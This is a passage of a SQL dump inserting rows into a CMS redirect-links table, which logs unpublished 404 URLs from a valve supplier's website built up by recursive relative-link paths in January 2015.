(1188, 'http://flotechcontrols.com///products/tideflex/products/red-valve', '', '', '', 1, 0, '2015-01-14 02:39:15', '0000-00-00 00:00:00'),
(1189, 'http://flotechcontrols.com///products/tideflex/products/tideflex', '', '', '', 1, 0, '2015-01-14 02:39:17', '0000-00-00 00:00:00'),
(1190, 'http://flotechcontrols.com///products/tideflex/products/wey', '', '', '', 1, 0, '2015-01-14 02:39:19', '0000-00-00 00:00:00'),
(1191, 'http://flotechcontrols.com///products/tideflex/products/noreva', '', '', '', 1, 0, '2015-01-14 02:39:20', '0000-00-00 00:00:00'),
(1192, 'http://flotechcontrols.com///products/tideflex/products/valvtechnologies', '', '', '', 1, 0, '2015-01-14 02:39:22', '0000-00-00 00:00:00'),
(1193, 'http://flotechcontrols.com///products/tideflex/products/birkett', '', '', '', 1, 0, '2015-01-14 02:39:23', '0000-00-00 00:00:00'),
(1194, 'http://flotechcontrols.com///products/tideflex/products/sor', '', '', '', 1, 0, '2015-01-14 02:39:25', '0000-00-00 00:00:00'),
(1195, 'http://flotechcontrols.com///products/tideflex/products/mts', '', '', '', 1, 0, '2015-01-14 02:39:27', '0000-00-00 00:00:00'),
(1196, 'http://flotechcontrols.com///products/tideflex/products/copes', '', '', '', 1, 0, '2015-01-14 02:39:28', '0000-00-00 00:00:00'),
(1197, 'http://flotechcontrols.com///products/tideflex/application-sectors/power', '', '', '', 1, 0, '2015-01-14 02:39:30', '0000-00-00 00:00:00'),
(1198, 'http://flotechcontrols.com///products/tideflex/application-sectors/water', '', '', '', 1, 0, '2015-01-14 02:39:31', '0000-00-00 00:00:00'),
(1199, 'http://flotechcontrols.com///products/tideflex/application-sectors/mining', '', '', '', 1, 0, '2015-01-14 02:39:33', '0000-00-00 00:00:00'),
(1200, 'http://flotechcontrols.com///products/tideflex/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-14 02:39:34', '0000-00-00 00:00:00'),
(1201, 'http://flotechcontrols.com///products/tideflex/contact-us', '', '', '', 1, 0, '2015-01-14 02:39:36', '0000-00-00 00:00:00'),
(1202, 'http://flotechcontrols.com///products/wey/about-us', '', '', '', 1, 0, '2015-01-14 02:39:40', '0000-00-00 00:00:00'),
(1203, 'http://flotechcontrols.com///products/wey/products/red-valve', '', '', '', 1, 0, '2015-01-14 02:39:41', '0000-00-00 00:00:00'),
(1204, 'http://flotechcontrols.com///products/wey/products/tideflex', '', '', '', 1, 0, '2015-01-14 02:39:43', '0000-00-00 00:00:00'),
(1205, 'http://flotechcontrols.com///products/wey/products/wey', '', '', '', 1, 0, '2015-01-14 02:39:44', '0000-00-00 00:00:00'),
(1206, 'http://flotechcontrols.com///products/wey/products/noreva', '', '', '', 1, 0, '2015-01-14 02:39:46', '0000-00-00 00:00:00'),
(1207, 'http://flotechcontrols.com///products/wey/products/valvtechnologies', '', '', '', 1, 0, '2015-01-14 02:39:47', '0000-00-00 00:00:00'),
(1208, 'http://flotechcontrols.com///products/wey/products/birkett', '', '', '', 1, 0, '2015-01-14 02:39:49', '0000-00-00 00:00:00'),
(1209, 'http://flotechcontrols.com///products/wey/products/sor', '', '', '', 1, 0, '2015-01-14 02:39:51', '0000-00-00 00:00:00'),
(1210, 'http://flotechcontrols.com///products/wey/products/mts', '', '', '', 1, 0, '2015-01-14 02:39:52', '0000-00-00 00:00:00'),
(1211, 'http://flotechcontrols.com///products/wey/products/copes', '', '', '', 1, 0, '2015-01-14 02:39:54', '0000-00-00 00:00:00'),
(1212, 'http://flotechcontrols.com///products/wey/application-sectors/power', '', '', '', 1, 0, '2015-01-14 02:39:55', '0000-00-00 00:00:00'),
(1213, 'http://flotechcontrols.com///products/wey/application-sectors/water', '', '', '', 1, 0, '2015-01-14 02:39:57', '0000-00-00 00:00:00'),
(1214, 'http://flotechcontrols.com///products/wey/application-sectors/mining', '', '', '', 1, 0, '2015-01-14 02:39:58', '0000-00-00 00:00:00'),
(1215, 'http://flotechcontrols.com///products/wey/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-14 02:40:00', '0000-00-00 00:00:00'),
(1216, 'http://flotechcontrols.com///products/wey/contact-us', '', '', '', 1, 0, '2015-01-14 02:40:02', '0000-00-00 00:00:00'),
(1217, 'http://flotechcontrols.com///products/noreva/about-us', '', '', '', 1, 0, '2015-01-14 02:40:05', '0000-00-00 00:00:00'),
(1218, 'http://flotechcontrols.com///products/noreva/products/red-valve', '', '', '', 1, 0, '2015-01-14 02:40:07', '0000-00-00 00:00:00'),
(1219, 'http://flotechcontrols.com///products/noreva/products/tideflex', '', '', '', 1, 0, '2015-01-14 02:40:08', '0000-00-00 00:00:00'),
(1220, 'http://flotechcontrols.com///products/noreva/products/wey', '', '', '', 1, 0, '2015-01-14 02:40:10', '0000-00-00 00:00:00'),
(1221, 'http://flotechcontrols.com///products/noreva/products/noreva', '', '', '', 1, 0, '2015-01-14 02:40:12', '0000-00-00 00:00:00'),
(1222, 'http://flotechcontrols.com///products/noreva/products/valvtechnologies', '', '', '', 1, 0, '2015-01-14 02:40:13', '0000-00-00 00:00:00'),
(1223, 'http://flotechcontrols.com///products/noreva/products/birkett', '', '', '', 1, 0, '2015-01-14 02:40:15', '0000-00-00 00:00:00'),
(1224, 'http://flotechcontrols.com///products/noreva/products/sor', '', '', '', 1, 0, '2015-01-14 02:40:16', '0000-00-00 00:00:00'),
(1225, 'http://flotechcontrols.com///products/noreva/products/mts', '', '', '', 1, 0, '2015-01-14 02:40:18', '0000-00-00 00:00:00'),
(1226, 'http://flotechcontrols.com///products/noreva/products/copes', '', '', '', 1, 0, '2015-01-14 02:40:19', '0000-00-00 00:00:00'),
(1227, 'http://flotechcontrols.com///products/noreva/application-sectors/power', '', '', '', 1, 0, '2015-01-14 02:40:21', '0000-00-00 00:00:00'),
(1228, 'http://flotechcontrols.com///products/noreva/application-sectors/water', '', '', '', 1, 0, '2015-01-14 02:40:23', '0000-00-00 00:00:00'),
(1229, 'http://flotechcontrols.com///products/noreva/application-sectors/mining', '', '', '', 1, 0, '2015-01-14 02:40:24', '0000-00-00 00:00:00'),
(1230, 'http://flotechcontrols.com///products/noreva/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-14 02:40:26', '0000-00-00 00:00:00'),
(1231, 'http://flotechcontrols.com///products/noreva/contact-us', '', '', '', 1, 0, '2015-01-14 02:40:27', '0000-00-00 00:00:00'),
(1232, 'http://flotechcontrols.com///products/valvtechnologies/about-us', '', '', '', 1, 0, '2015-01-14 02:40:31', '0000-00-00 00:00:00'),
(1233, 'http://flotechcontrols.com///products/valvtechnologies/products/red-valve', '', '', '', 1, 0, '2015-01-14 02:40:32', '0000-00-00 00:00:00'),
(1234, 'http://flotechcontrols.com///products/valvtechnologies/products/tideflex', '', '', '', 1, 0, '2015-01-14 02:40:34', '0000-00-00 00:00:00'),
(1235, 'http://flotechcontrols.com///products/valvtechnologies/products/wey', '', '', '', 1, 0, '2015-01-14 02:40:36', '0000-00-00 00:00:00'),
(1236, 'http://flotechcontrols.com///products/valvtechnologies/products/noreva', '', '', '', 1, 0, '2015-01-14 02:40:37', '0000-00-00 00:00:00'),
(1237, 'http://flotechcontrols.com///products/valvtechnologies/products/valvtechnologies', '', '', '', 1, 0, '2015-01-14 02:40:39', '0000-00-00 00:00:00'),
(1238, 'http://flotechcontrols.com///products/valvtechnologies/products/birkett', '', '', '', 1, 0, '2015-01-14 02:40:40', '0000-00-00 00:00:00'),
(1239, 'http://flotechcontrols.com///products/valvtechnologies/products/sor', '', '', '', 1, 0, '2015-01-14 02:40:42', '0000-00-00 00:00:00'),
(1240, 'http://flotechcontrols.com///products/valvtechnologies/products/mts', '', '', '', 1, 0, '2015-01-14 02:40:43', '0000-00-00 00:00:00'),
(1241, 'http://flotechcontrols.com///products/valvtechnologies/products/copes', '', '', '', 1, 0, '2015-01-14 02:40:45', '0000-00-00 00:00:00'),
(1242, 'http://flotechcontrols.com///products/valvtechnologies/application-sectors/power', '', '', '', 1, 0, '2015-01-14 02:40:47', '0000-00-00 00:00:00'),
(1243, 'http://flotechcontrols.com///products/valvtechnologies/application-sectors/water', '', '', '', 1, 0, '2015-01-14 02:40:48', '0000-00-00 00:00:00'),
(1244, 'http://flotechcontrols.com///products/valvtechnologies/application-sectors/mining', '', '', '', 1, 0, '2015-01-14 02:40:50', '0000-00-00 00:00:00'),
(1245, 'http://flotechcontrols.com///products/valvtechnologies/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-14 02:40:51', '0000-00-00 00:00:00'),
(1246, 'http://flotechcontrols.com///products/valvtechnologies/contact-us', '', '', '', 1, 0, '2015-01-14 02:40:53', '0000-00-00 00:00:00'),
(1247, 'http://flotechcontrols.com///products/birkett/about-us', '', '', '', 1, 0, '2015-01-14 02:40:57', '0000-00-00 00:00:00'),
(1248, 'http://flotechcontrols.com///products/birkett/products/red-valve', '', '', '', 1, 0, '2015-01-14 02:40:58', '0000-00-00 00:00:00'),
(1249, 'http://flotechcontrols.com///products/birkett/products/tideflex', '', '', '', 1, 0, '2015-01-14 02:41:00', '0000-00-00 00:00:00'),
(1250, 'http://flotechcontrols.com///products/birkett/products/wey', '', '', '', 1, 0, '2015-01-14 02:41:02', '0000-00-00 00:00:00'),
(1251, 'http://flotechcontrols.com///products/birkett/products/noreva', '', '', '', 1, 0, '2015-01-14 02:41:03', '0000-00-00 00:00:00'),
(1252, 'http://flotechcontrols.com///products/birkett/products/valvtechnologies', '', '', '', 1, 0, '2015-01-14 02:41:05', '0000-00-00 00:00:00'),
(1253, 'http://flotechcontrols.com///products/birkett/products/birkett', '', '', '', 1, 0, '2015-01-14 02:41:06', '0000-00-00 00:00:00'),
(1254, 'http://flotechcontrols.com///products/birkett/products/sor', '', '', '', 1, 0, '2015-01-14 02:41:08', '0000-00-00 00:00:00'),
(1255, 'http://flotechcontrols.com///products/birkett/products/mts', '', '', '', 1, 0, '2015-01-14 02:41:09', '0000-00-00 00:00:00'),
(1256, 'http://flotechcontrols.com///products/birkett/products/copes', '', '', '', 1, 0, '2015-01-14 02:41:11', '0000-00-00 00:00:00'),
(1257, 'http://flotechcontrols.com///products/birkett/application-sectors/power', '', '', '', 1, 0, '2015-01-14 02:41:13', '0000-00-00 00:00:00'),
(1258, 'http://flotechcontrols.com///products/birkett/application-sectors/water', '', '', '', 1, 0, '2015-01-14 02:41:14', '0000-00-00 00:00:00'),
(1259, 'http://flotechcontrols.com///products/birkett/application-sectors/mining', '', '', '', 1, 0, '2015-01-14 02:41:16', '0000-00-00 00:00:00'),
(1260, 'http://flotechcontrols.com///products/birkett/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-14 02:41:17', '0000-00-00 00:00:00'),
(1261, 'http://flotechcontrols.com///products/birkett/contact-us', '', '', '', 1, 0, '2015-01-14 02:41:19', '0000-00-00 00:00:00'),
(1262, 'http://flotechcontrols.com///products/sor/about-us', '', '', '', 1, 0, '2015-01-14 02:41:23', '0000-00-00 00:00:00'),
(1263, 'http://flotechcontrols.com///products/sor/products/red-valve', '', '', '', 1, 0, '2015-01-14 02:41:24', '0000-00-00 00:00:00'),
(1264, 'http://flotechcontrols.com///products/sor/products/tideflex', '', '', '', 1, 0, '2015-01-14 02:41:26', '0000-00-00 00:00:00'),
(1265, 'http://flotechcontrols.com///products/sor/products/wey', '', '', '', 1, 0, '2015-01-14 02:41:28', '0000-00-00 00:00:00'),
(1266, 'http://flotechcontrols.com///products/sor/products/noreva', '', '', '', 1, 0, '2015-01-14 02:41:29', '0000-00-00 00:00:00'),
(1267, 'http://flotechcontrols.com///products/sor/products/valvtechnologies', '', '', '', 1, 0, '2015-01-14 02:41:31', '0000-00-00 00:00:00'),
(1268, 'http://flotechcontrols.com///products/sor/products/birkett', '', '', '', 1, 0, '2015-01-14 02:41:32', '0000-00-00 00:00:00'),
(1269, 'http://flotechcontrols.com///products/sor/products/sor', '', '', '', 1, 0, '2015-01-14 02:41:34', '0000-00-00 00:00:00'),
(1270, 'http://flotechcontrols.com///products/sor/products/mts', '', '', '', 1, 0, '2015-01-14 02:41:36', '0000-00-00 00:00:00'),
(1271, 'http://flotechcontrols.com///products/sor/products/copes', '', '', '', 1, 0, '2015-01-14 02:41:37', '0000-00-00 00:00:00'),
(1272, 'http://flotechcontrols.com///products/sor/application-sectors/power', '', '', '', 1, 0, '2015-01-14 02:41:39', '0000-00-00 00:00:00'),
(1273, 'http://flotechcontrols.com///products/sor/application-sectors/water', '', '', '', 1, 0, '2015-01-14 02:41:40', '0000-00-00 00:00:00'),
(1274, 'http://flotechcontrols.com///products/sor/application-sectors/mining', '', '', '', 1, 0, '2015-01-14 02:41:42', '0000-00-00 00:00:00'),
(1275, 'http://flotechcontrols.com///products/sor/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-14 02:41:43', '0000-00-00 00:00:00'),
(1276, 'http://flotechcontrols.com///products/sor/contact-us', '', '', '', 1, 0, '2015-01-14 02:41:45', '0000-00-00 00:00:00'),
(1277, 'http://flotechcontrols.com///products/mts/about-us', '', '', '', 1, 0, '2015-01-14 02:41:48', '0000-00-00 00:00:00'),
(1278, 'http://flotechcontrols.com///products/mts/products/red-valve', '', '', '', 1, 0, '2015-01-14 02:41:50', '0000-00-00 00:00:00'),
(1279, 'http://flotechcontrols.com///products/mts/products/tideflex', '', '', '', 1, 0, '2015-01-14 02:41:52', '0000-00-00 00:00:00'),
(1280, 'http://flotechcontrols.com///products/mts/products/wey', '', '', '', 1, 0, '2015-01-14 02:41:53', '0000-00-00 00:00:00'),
(1281, 'http://flotechcontrols.com///products/mts/products/noreva', '', '', '', 1, 0, '2015-01-14 02:41:55', '0000-00-00 00:00:00'),
(1282, 'http://flotechcontrols.com///products/mts/products/valvtechnologies', '', '', '', 1, 0, '2015-01-14 02:41:56', '0000-00-00 00:00:00'),
(1283, 'http://flotechcontrols.com///products/mts/products/birkett', '', '', '', 1, 0, '2015-01-14 02:41:58', '0000-00-00 00:00:00'),
(1284, 'http://flotechcontrols.com///products/mts/products/sor', '', '', '', 1, 0, '2015-01-14 02:41:59', '0000-00-00 00:00:00'),
(1285, 'http://flotechcontrols.com///products/mts/products/mts', '', '', '', 1, 0, '2015-01-14 02:42:01', '0000-00-00 00:00:00'),
(1286, 'http://flotechcontrols.com///products/mts/products/copes', '', '', '', 1, 0, '2015-01-14 02:42:03', '0000-00-00 00:00:00'),
(1287, 'http://flotechcontrols.com///products/mts/application-sectors/power', '', '', '', 1, 0, '2015-01-14 02:42:04', '0000-00-00 00:00:00'),
(1288, 'http://flotechcontrols.com///products/mts/application-sectors/water', '', '', '', 1, 0, '2015-01-14 02:42:06', '0000-00-00 00:00:00'),
(1289, 'http://flotechcontrols.com///products/mts/application-sectors/mining', '', '', '', 1, 0, '2015-01-14 02:42:07', '0000-00-00 00:00:00'),
(1290, 'http://flotechcontrols.com///products/mts/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-14 02:42:09', '0000-00-00 00:00:00'),
(1291, 'http://flotechcontrols.com///products/mts/contact-us', '', '', '', 1, 0, '2015-01-14 02:42:10', '0000-00-00 00:00:00'),
(1292, 'http://flotechcontrols.com///products/copes/about-us', '', '', '', 1, 0, '2015-01-14 02:42:14', '0000-00-00 00:00:00'),
(1293, 'http://flotechcontrols.com///products/copes/products/red-valve', '', '', '', 1, 0, '2015-01-14 02:42:15', '0000-00-00 00:00:00'),
(1294, 'http://flotechcontrols.com///products/copes/products/tideflex', '', '', '', 1, 0, '2015-01-14 02:42:17', '0000-00-00 00:00:00'),
(1295, 'http://flotechcontrols.com///products/copes/products/wey', '', '', '', 1, 0, '2015-01-14 02:42:19', '0000-00-00 00:00:00'),
(1296, 'http://flotechcontrols.com///products/copes/products/noreva', '', '', '', 1, 0, '2015-01-14 02:42:20', '0000-00-00 00:00:00'),
(1297, 'http://flotechcontrols.com///products/copes/products/valvtechnologies', '', '', '', 1, 0, '2015-01-14 02:42:22', '0000-00-00 00:00:00'),
(1298, 'http://flotechcontrols.com///products/copes/products/birkett', '', '', '', 1, 0, '2015-01-14 02:42:23', '0000-00-00 00:00:00'),
(1299, 'http://flotechcontrols.com///products/copes/products/sor', '', '', '', 1, 0, '2015-01-14 02:42:25', '0000-00-00 00:00:00'),
(1300, 'http://flotechcontrols.com///products/copes/products/mts', '', '', '', 1, 0, '2015-01-14 02:42:26', '0000-00-00 00:00:00'),
(1301, 'http://flotechcontrols.com///products/copes/products/copes', '', '', '', 1, 0, '2015-01-14 02:42:28', '0000-00-00 00:00:00'),
(1302, 'http://flotechcontrols.com///products/copes/application-sectors/power', '', '', '', 1, 0, '2015-01-14 02:42:30', '0000-00-00 00:00:00'),
(1303, 'http://flotechcontrols.com///products/copes/application-sectors/water', '', '', '', 1, 0, '2015-01-14 02:42:31', '0000-00-00 00:00:00'),
(1304, 'http://flotechcontrols.com///products/copes/application-sectors/mining', '', '', '', 1, 0, '2015-01-14 02:42:33', '0000-00-00 00:00:00'),
(1305, 'http://flotechcontrols.com///products/copes/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-14 02:42:34', '0000-00-00 00:00:00'),
(1306, 'http://flotechcontrols.com///products/copes/contact-us', '', '', '', 1, 0, '2015-01-14 02:42:36', '0000-00-00 00:00:00'),
(1307, 'http://flotechcontrols.com///application-sectors/power/about-us', '', '', '', 1, 0, '2015-01-14 02:42:39', '0000-00-00 00:00:00'),
(1308, 'http://flotechcontrols.com///application-sectors/power/products/red-valve', '', '', '', 1, 0, '2015-01-14 02:42:41', '0000-00-00 00:00:00'),
(1309, 'http://flotechcontrols.com///application-sectors/power/products/tideflex', '', '', '', 1, 0, '2015-01-14 02:42:43', '0000-00-00 00:00:00'),
(1310, 'http://flotechcontrols.com///application-sectors/power/products/wey', '', '', '', 1, 0, '2015-01-14 02:42:44', '0000-00-00 00:00:00'),
(1311, 'http://flotechcontrols.com///application-sectors/power/products/noreva', '', '', '', 1, 0, '2015-01-14 02:42:46', '0000-00-00 00:00:00'),
(1312, 'http://flotechcontrols.com///application-sectors/power/products/valvtechnologies', '', '', '', 1, 0, '2015-01-14 02:42:47', '0000-00-00 00:00:00'),
(1313, 'http://flotechcontrols.com///application-sectors/power/products/birkett', '', '', '', 1, 0, '2015-01-14 02:42:49', '0000-00-00 00:00:00'),
(1314, 'http://flotechcontrols.com///application-sectors/power/products/sor', '', '', '', 1, 0, '2015-01-14 02:42:51', '0000-00-00 00:00:00'),
(1315, 'http://flotechcontrols.com///application-sectors/power/products/mts', '', '', '', 1, 0, '2015-01-14 02:42:52', '0000-00-00 00:00:00'),
(1316, 'http://flotechcontrols.com///application-sectors/power/products/copes', '', '', '', 1, 0, '2015-01-14 02:42:54', '0000-00-00 00:00:00'),
(1317, 'http://flotechcontrols.com///application-sectors/power/application-sectors/power', '', '', '', 1, 0, '2015-01-14 02:42:55', '0000-00-00 00:00:00'),
(1318, 'http://flotechcontrols.com///application-sectors/power/application-sectors/water', '', '', '', 1, 0, '2015-01-14 02:42:57', '0000-00-00 00:00:00'),
(1319, 'http://flotechcontrols.com///application-sectors/power/application-sectors/mining', '', '', '', 1, 0, '2015-01-14 02:42:58', '0000-00-00 00:00:00'),
(1320, 'http://flotechcontrols.com///application-sectors/power/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-14 02:43:00', '0000-00-00 00:00:00'),
(1321, 'http://flotechcontrols.com///application-sectors/power/contact-us', '', '', '', 1, 0, '2015-01-14 02:43:02', '0000-00-00 00:00:00'),
(1322, 'http://flotechcontrols.com///application-sectors/water/about-us', '', '', '', 1, 0, '2015-01-14 02:43:05', '0000-00-00 00:00:00'),
(1323, 'http://flotechcontrols.com///application-sectors/water/products/red-valve', '', '', '', 1, 0, '2015-01-14 02:43:07', '0000-00-00 00:00:00'),
(1324, 'http://flotechcontrols.com///application-sectors/water/products/tideflex', '', '', '', 1, 0, '2015-01-14 02:43:08', '0000-00-00 00:00:00'),
(1325, 'http://flotechcontrols.com///application-sectors/water/products/wey', '', '', '', 1, 0, '2015-01-14 02:43:10', '0000-00-00 00:00:00'),
(1326, 'http://flotechcontrols.com///application-sectors/water/products/noreva', '', '', '', 1, 0, '2015-01-14 02:43:12', '0000-00-00 00:00:00'),
(1327, 'http://flotechcontrols.com///application-sectors/water/products/valvtechnologies', '', '', '', 1, 0, '2015-01-14 02:43:13', '0000-00-00 00:00:00'),
(1328, 'http://flotechcontrols.com///application-sectors/water/products/birkett', '', '', '', 1, 0, '2015-01-14 02:43:15', '0000-00-00 00:00:00'),
(1329, 'http://flotechcontrols.com///application-sectors/water/products/sor', '', '', '', 1, 0, '2015-01-14 02:43:16', '0000-00-00 00:00:00'),
(1330, 'http://flotechcontrols.com///application-sectors/water/products/mts', '', '', '', 1, 0, '2015-01-14 02:43:18', '0000-00-00 00:00:00'),
(1331, 'http://flotechcontrols.com///application-sectors/water/products/copes', '', '', '', 1, 0, '2015-01-14 02:43:19', '0000-00-00 00:00:00'),
(1332, 'http://flotechcontrols.com///application-sectors/water/application-sectors/power', '', '', '', 1, 0, '2015-01-14 02:43:21', '0000-00-00 00:00:00'),
(1333, 'http://flotechcontrols.com///application-sectors/water/application-sectors/water', '', '', '', 1, 0, '2015-01-14 02:43:23', '0000-00-00 00:00:00'),
(1334, 'http://flotechcontrols.com///application-sectors/water/application-sectors/mining', '', '', '', 1, 0, '2015-01-14 02:43:24', '0000-00-00 00:00:00'),
(1335, 'http://flotechcontrols.com///application-sectors/water/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-14 02:43:26', '0000-00-00 00:00:00'),
(1336, 'http://flotechcontrols.com///application-sectors/water/contact-us', '', '', '', 1, 0, '2015-01-14 02:43:27', '0000-00-00 00:00:00'),
(1337, 'http://flotechcontrols.com///application-sectors/mining/about-us', '', '', '', 1, 0, '2015-01-14 02:43:31', '0000-00-00 00:00:00'),
(1338, 'http://flotechcontrols.com///application-sectors/mining/products/red-valve', '', '', '', 1, 0, '2015-01-14 02:43:33', '0000-00-00 00:00:00'),
(1339, 'http://flotechcontrols.com///application-sectors/mining/products/tideflex', '', '', '', 1, 0, '2015-01-14 02:43:34', '0000-00-00 00:00:00'),
(1340, 'http://flotechcontrols.com///application-sectors/mining/products/wey', '', '', '', 1, 0, '2015-01-14 02:43:36', '0000-00-00 00:00:00'),
(1341, 'http://flotechcontrols.com///application-sectors/mining/products/noreva', '', '', '', 1, 0, '2015-01-14 02:43:37', '0000-00-00 00:00:00'),
(1342, 'http://flotechcontrols.com///application-sectors/mining/products/valvtechnologies', '', '', '', 1, 0, '2015-01-14 02:43:39', '0000-00-00 00:00:00'),
(1343, 'http://flotechcontrols.com///application-sectors/mining/products/birkett', '', '', '', 1, 0, '2015-01-14 02:43:40', '0000-00-00 00:00:00'),
(1344, 'http://flotechcontrols.com///application-sectors/mining/products/sor', '', '', '', 1, 0, '2015-01-14 02:43:42', '0000-00-00 00:00:00'),
(1345, 'http://flotechcontrols.com///application-sectors/mining/products/mts', '', '', '', 1, 0, '2015-01-14 02:43:44', '0000-00-00 00:00:00'),
(1346, 'http://flotechcontrols.com///application-sectors/mining/products/copes', '', '', '', 1, 0, '2015-01-14 02:43:45', '0000-00-00 00:00:00'),
(1347, 'http://flotechcontrols.com///application-sectors/mining/application-sectors/power', '', '', '', 1, 0, '2015-01-14 02:43:47', '0000-00-00 00:00:00'),
(1348, 'http://flotechcontrols.com///application-sectors/mining/application-sectors/water', '', '', '', 1, 0, '2015-01-14 02:43:48', '0000-00-00 00:00:00'),
(1349, 'http://flotechcontrols.com///application-sectors/mining/application-sectors/mining', '', '', '', 1, 0, '2015-01-14 02:43:50', '0000-00-00 00:00:00'),
(1350, 'http://flotechcontrols.com///application-sectors/mining/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-14 02:43:52', '0000-00-00 00:00:00'),
(1351, 'http://flotechcontrols.com///application-sectors/mining/contact-us', '', '', '', 1, 0, '2015-01-14 02:43:53', '0000-00-00 00:00:00'),
(1352, 'http://flotechcontrols.com///application-sectors/oil-and-gas/about-us', '', '', '', 1, 0, '2015-01-14 02:43:57', '0000-00-00 00:00:00'),
(1353, 'http://flotechcontrols.com///application-sectors/oil-and-gas/products/red-valve', '', '', '', 1, 0, '2015-01-14 02:43:58', '0000-00-00 00:00:00'),
(1354, 'http://flotechcontrols.com///application-sectors/oil-and-gas/products/tideflex', '', '', '', 1, 0, '2015-01-14 02:44:00', '0000-00-00 00:00:00'),
(1355, 'http://www.flotechcontrols.com/about-us/about-us', '', '', '', 1, 0, '2015-01-15 17:59:01', '0000-00-00 00:00:00'),
(1356, 'http://www.flotechcontrols.com/about-us/products/red-valve', '', '', '', 1, 0, '2015-01-15 17:59:04', '0000-00-00 00:00:00'),
(1357, 'http://www.flotechcontrols.com/about-us/products/tideflex', '', '', '', 1, 0, '2015-01-15 17:59:07', '0000-00-00 00:00:00'),
(1358, 'http://www.flotechcontrols.com/about-us/products/wey', '', '', '', 1, 0, '2015-01-15 17:59:09', '0000-00-00 00:00:00'),
(1359, 'http://www.flotechcontrols.com/about-us/products/noreva', '', '', '', 1, 0, '2015-01-15 17:59:12', '0000-00-00 00:00:00'),
(1360, 'http://www.flotechcontrols.com/about-us/products/valvtechnologies', '', '', '', 1, 0, '2015-01-15 17:59:14', '0000-00-00 00:00:00'),
(1361, 'http://www.flotechcontrols.com/about-us/products/birkett', '', '', '', 1, 0, '2015-01-15 17:59:17', '0000-00-00 00:00:00'),
(1362, 'http://www.flotechcontrols.com/about-us/products/sor', '', '', '', 1, 0, '2015-01-15 17:59:19', '0000-00-00 00:00:00'),
(1363, 'http://www.flotechcontrols.com/about-us/products/mts', '', '', '', 1, 0, '2015-01-15 17:59:22', '0000-00-00 00:00:00'),
(1364, 'http://www.flotechcontrols.com/about-us/products/copes', '', '', '', 1, 0, '2015-01-15 17:59:25', '0000-00-00 00:00:00'),
(1365, 'http://www.flotechcontrols.com/about-us/application-sectors/power', '', '', '', 1, 0, '2015-01-15 17:59:27', '0000-00-00 00:00:00'),
(1366, 'http://www.flotechcontrols.com/about-us/application-sectors/water', '', '', '', 1, 0, '2015-01-15 17:59:30', '0000-00-00 00:00:00'),
(1367, 'http://www.flotechcontrols.com/about-us/application-sectors/mining', '', '', '', 1, 0, '2015-01-15 17:59:32', '0000-00-00 00:00:00'),
(1368, 'http://www.flotechcontrols.com/about-us/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-15 17:59:35', '0000-00-00 00:00:00'),
(1369, 'http://www.flotechcontrols.com/about-us/contact-us', '', '', '', 1, 0, '2015-01-15 17:59:37', '0000-00-00 00:00:00'),
(1370, 'http://www.flotechcontrols.com/products/red-valve/about-us', '', '', '', 1, 0, '2015-01-15 17:59:43', '0000-00-00 00:00:00'),
(1371, 'http://www.flotechcontrols.com/products/red-valve/products/red-valve', '', '', '', 1, 0, '2015-01-15 17:59:45', '0000-00-00 00:00:00'),
(1372, 'http://www.flotechcontrols.com/products/red-valve/products/tideflex', '', '', '', 1, 0, '2015-01-15 17:59:48', '0000-00-00 00:00:00'),
(1373, 'http://www.flotechcontrols.com/products/red-valve/products/wey', '', '', '', 1, 0, '2015-01-15 17:59:51', '0000-00-00 00:00:00'),
(1374, 'http://www.flotechcontrols.com/products/red-valve/products/noreva', '', '', '', 1, 0, '2015-01-15 17:59:53', '0000-00-00 00:00:00'),
(1375, 'http://www.flotechcontrols.com/products/red-valve/products/valvtechnologies', '', '', '', 1, 0, '2015-01-15 17:59:56', '0000-00-00 00:00:00'),
(1376, 'http://www.flotechcontrols.com/products/red-valve/products/birkett', '', '', '', 1, 0, '2015-01-15 17:59:58', '0000-00-00 00:00:00'),
(1377, 'http://www.flotechcontrols.com/products/red-valve/products/sor', '', '', '', 1, 0, '2015-01-15 18:00:01', '0000-00-00 00:00:00'),
(1378, 'http://www.flotechcontrols.com/products/red-valve/products/mts', '', '', '', 1, 0, '2015-01-15 18:00:04', '0000-00-00 00:00:00'),
(1379, 'http://www.flotechcontrols.com/products/red-valve/products/copes', '', '', '', 1, 0, '2015-01-15 18:00:07', '0000-00-00 00:00:00'),
(1380, 'http://www.flotechcontrols.com/products/red-valve/application-sectors/power', '', '', '', 1, 0, '2015-01-15 18:00:09', '0000-00-00 00:00:00'),
(1381, 'http://www.flotechcontrols.com/products/red-valve/application-sectors/water', '', '', '', 1, 0, '2015-01-15 18:00:12', '0000-00-00 00:00:00'),
(1382, 'http://www.flotechcontrols.com/products/red-valve/application-sectors/mining', '', '', '', 1, 0, '2015-01-15 18:00:15', '0000-00-00 00:00:00'),
(1383, 'http://www.flotechcontrols.com/products/red-valve/application-sectors/oil-and-gas', '', '', '', 1, 0, '2015-01-15 18:00:17', '0000-00-00 00:00:00');
INSERT INTO `j6kpf_redirect_links` (`id`, `old_url`, `new_url`, `referer`, `comment`, `hits`, `published`, `created_date`, `modified_date`) VALUES
(1384, 'http://www.flotechcontrols.com/products/red-valve/contact-us', '', '', '', 1, 0, '2015-01-15 18:00:20', '0000-00-00 00:00:00'),
(1385, 'http://www.flotechcontrols.com/products/tideflex/about-us', '', '', '', 1, 0, '2015-01-15 18:00:25', '0000-00-00 00:00:00'),
(1386, 'http://www.flotechcontrols.com/products/tideflex/products/red-valve', '', '', '', 1, 0, '2015-01-15 18:00:28', '0000-00-00 00:00:00'),
(1387, 'http://www.flotechcontrols.com/products/tideflex/products/tideflex', '', '', '', 1, 0, '2015-01-15 18:00:30', '0000-00-00 00:00:00'),
(1388, 'http://www.flotechcontrols.com/products/tideflex/products/wey', '', '', '', 1, 0, '2015-01-15 18:00:33', '0000-00-00 00:00:00'),
